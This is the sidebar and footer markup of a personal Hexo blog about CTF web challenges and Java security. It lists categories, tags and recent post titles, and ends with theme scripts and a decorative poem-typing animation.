        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                14
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/posts/10200.html"><i class="fa  fa-book"></i> 2024鹏城杯线上赛Web方向题解</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/49264.html"><i class="fa  fa-book"></i> dasctf十月web方向部分题解</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/61598.html"><i class="fa  fa-book"></i> tornado原型链污染学习</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/24747.html"><i class="fa  fa-book"></i> 从2024巅峰极客的easy_java学习jdk17下的反序列化</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/42959.html"><i class="fa  fa-book"></i> ErloGrave 复现</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>

        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
                        
                        
                        
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2024 Err0r233 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                        <div id="binft"></div>
  <script>
    var binft = function (r) {
      function t() {
        return b[Math.floor(Math.random() * b.length)]
      }  
      function e() {
        return String.fromCharCode(94 * Math.random() + 33)
      }
      function n(r) {
        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
          var l = document.createElement("span");
          l.textContent = e(), l.style.color = t(), n.appendChild(l)
        }
        return n
      }
      function i() {
        var t = o[c.skillI];
        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
      }
      var l = "",
      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
      return r + ""
      }),
      a = 2,
      g = 1,
      s = 5,
      d = 75,
      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
      c = {
        text: "",
        prefixP: -s,
        skillI: 0,
        skillP: 0,
        direction: "forward",
        delay: a,
        step: g
      };
      i()
      };
      binft(document.getElementById('binft'));
  </script>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="7733928587"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>



<!-- Extra support for third-party plguins  -->



    </body>
</html>